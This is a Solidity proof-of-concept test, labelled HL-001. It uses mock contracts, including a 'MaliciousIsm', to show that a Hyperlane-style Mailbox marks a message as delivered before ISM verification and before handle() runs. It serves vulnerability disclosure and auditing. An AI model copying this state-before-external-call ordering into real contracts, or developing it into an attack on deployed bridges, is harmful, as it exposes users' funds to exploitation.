// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title HL-001 PoC: Mailbox.process() sets delivery state before ISM verification
 * @notice Demonstrates that delivered() returns true before handle() is called,
 *         due to the ordering: EFFECTS → ism.verify() → handle()
 *         When ISM executes arbitrary calls (CommitmentReadIsm → revealAndExecute),
 *         external contracts see delivered=true while handle hasn't run yet.
 *
 * This is a minimal mock-based reproduction. No mainnet fork needed.
 */

// ─── Minimal interfaces matching Hyperlane ───

interface IInterchainSecurityModule {
    function verify(bytes calldata _metadata, bytes calldata _message) external returns (bool);
}

interface IMessageRecipient {
    function handle(uint32 _origin, bytes32 _sender, bytes calldata _body) external payable;
}

// ─── Minimal Mailbox (reproduces exact process() logic from Hyperlane) ───

contract MockMailbox {
    struct Delivery {
        address processor;
        uint48 blockNumber;
    }

    mapping(bytes32 => Delivery) public deliveries;
    IInterchainSecurityModule public ism;
    IMessageRecipient public recipient;

    constructor(address _ism, address _recipient) {
        ism = IInterchainSecurityModule(_ism);
        recipient = IMessageRecipient(_recipient);
    }

    function delivered(bytes32 _id) public view returns (bool) {
        return deliveries[_id].blockNumber > 0;
    }

    /**
     * @notice Simplified process() matching Hyperlane's exact ordering:
     *   1. Set deliveries[_id] (EFFECTS)
     *   2. ism.verify() (INTERACTIONS) — can execute arbitrary calls
     *   3. recipient.handle() (INTERACTIONS)
     */
    function process(bytes32 _id, bytes calldata _metadata, bytes calldata _message) external {
        require(!delivered(_id), "already delivered");

        // EFFECTS — state set BEFORE verification
        deliveries[_id] = Delivery({
            processor: msg.sender,
            blockNumber: uint48(block.number)
        });

        // INTERACTIONS — ISM verify (CommitmentReadIsm executes external calls here)
        require(ism.verify(_metadata, _message), "ISM verification failed");

        // INTERACTIONS — handle called AFTER verify
        recipient.handle(0, bytes32(0), _message);
    }
}

// ─── Malicious ISM (simulates CommitmentReadIsm calling revealAndExecute) ───

contract MaliciousIsm is IInterchainSecurityModule {
    MockMailbox public mailbox;
    bytes32 public targetMsgId;

    // Observation state
    bool public deliveredDuringVerify;
    bool public handleCalledDuringVerify;

    VictimRecipient public recipient;

    function setup(address _mailbox, address _recipient, bytes32 _msgId) external {
        mailbox = MockMailbox(_mailbox);
        recipient = VictimRecipient(_recipient);
        targetMsgId = _msgId;
    }

    function verify(
        bytes calldata,
        bytes calldata
    ) external override returns (bool) {
        // This simulates what happens inside CommitmentReadIsm.verify()
        // when it calls ica.revealAndExecute(calls, salt).
        // The attacker-controlled calls can observe mailbox state.

        // Check: is the message marked as delivered?
        deliveredDuringVerify = mailbox.delivered(targetMsgId);

        // Check: has handle() been called on the recipient?
        handleCalledDuringVerify = recipient.handleCalled();

        // THE INVARIANT VIOLATION:
        // delivered = true, but handle has NOT been called yet
        // Any contract queried during revealAndExecute sees this inconsistent state

        return true;
    }
}

// ─── Victim Recipient ───

contract VictimRecipient is IMessageRecipient {
    bool public handleCalled;

    function handle(uint32, bytes32, bytes calldata) external payable override {
        handleCalled = true;
    }
}

// ─── Foundry Test ───

// Minimal forge-std interface for the test
interface Vm {
    function assertTrue(bool condition, string calldata message) external pure;
    function assertFalse(bool condition, string calldata message) external pure;
}

contract PoCTest {
    // forge-std cheatcode address
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    VictimRecipient recipient;
    MaliciousIsm ism;
    MockMailbox mailbox;
    bytes32 constant MSG_ID = keccak256("test-message-hl001");

    function setUp() public {
        recipient = new VictimRecipient();
        ism = new MaliciousIsm();
        mailbox = new MockMailbox(address(ism), address(recipient));
        ism.setup(address(mailbox), address(recipient), MSG_ID);
    }

    /**
     * @notice Core PoC: proves delivered() == true BEFORE handle() is called
     *
     * Timeline during mailbox.process():
     *   t0: deliveries[id] = Delivery{...}     → delivered() returns true
     *   t1: ism.verify() called
     *       └─ ISM observes: delivered()=true, handleCalled=false  ← BUG
     *   t2: recipient.handle() called           → handleCalled becomes true
     */
    function test_deliveredBeforeHandle() public {
        // Pre-state: nothing delivered
        assert(!mailbox.delivered(MSG_ID));
        assert(!recipient.handleCalled());

        // Process the message
        mailbox.process(MSG_ID, "", "");

        // Post-state: everything completed
        assert(mailbox.delivered(MSG_ID));
        assert(recipient.handleCalled());

        // THE PROOF: During ism.verify(), the ISM observed:
        assert(ism.deliveredDuringVerify());   // delivered() was TRUE
        assert(!ism.handleCalledDuringVerify()); // but handle() was NOT called yet

        // This proves the invariant violation:
        // An external observer (any contract called during ISM verification)
        // sees delivered=true while handle() hasn't executed.
        //
        // With CommitmentReadIsm, the "external observer" is whatever
        // ica.revealAndExecute(calls, salt) invokes — attacker-controlled calls.
    }
}
